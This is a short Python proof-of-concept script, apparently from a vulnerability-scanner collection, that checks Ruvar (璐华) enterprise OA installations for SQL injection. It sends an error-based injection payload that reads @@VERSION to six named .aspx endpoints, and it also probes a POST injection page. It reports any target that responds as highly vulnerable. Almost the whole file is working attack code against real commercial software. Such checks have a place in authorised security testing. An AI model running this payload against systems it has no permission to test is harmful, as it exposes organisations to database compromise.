#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华企业版OA系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-065191
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import sys
import requests



class ruvar_oa_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "ChAr(71)%2BChAr(81)%2BChAr(88)%2B@@VeRsIoN"
        urls = ["/flow/flow_get_if_value.aspx?template_id=",
                "/include/get_dict.aspx?bt_id=",
                "/LHMail/email_attach_delete.aspx?attach_id=",
                "/OnlineChat/chat_show.aspx?id=",
                "/OnlineChat/chatroom_show.aspx?id=",
                "/OnlineReport/get_condiction.aspx?t_id="]
        try:
            for turl in urls:
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code == 500 and r"GQXMicrosoft" in req.text:
                    return "[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl

            req = requests.get(self.url+"/include/get_user.aspx", headers=headers, timeout=10, verify=False)
            if r"button_normal" in req.text:
                return "[+]存在璐华企业版OA系统POST SQL注入漏洞...(高危)\tpayload: "+self.url+"/include/get_user.aspx"

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = ruvar_oa_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()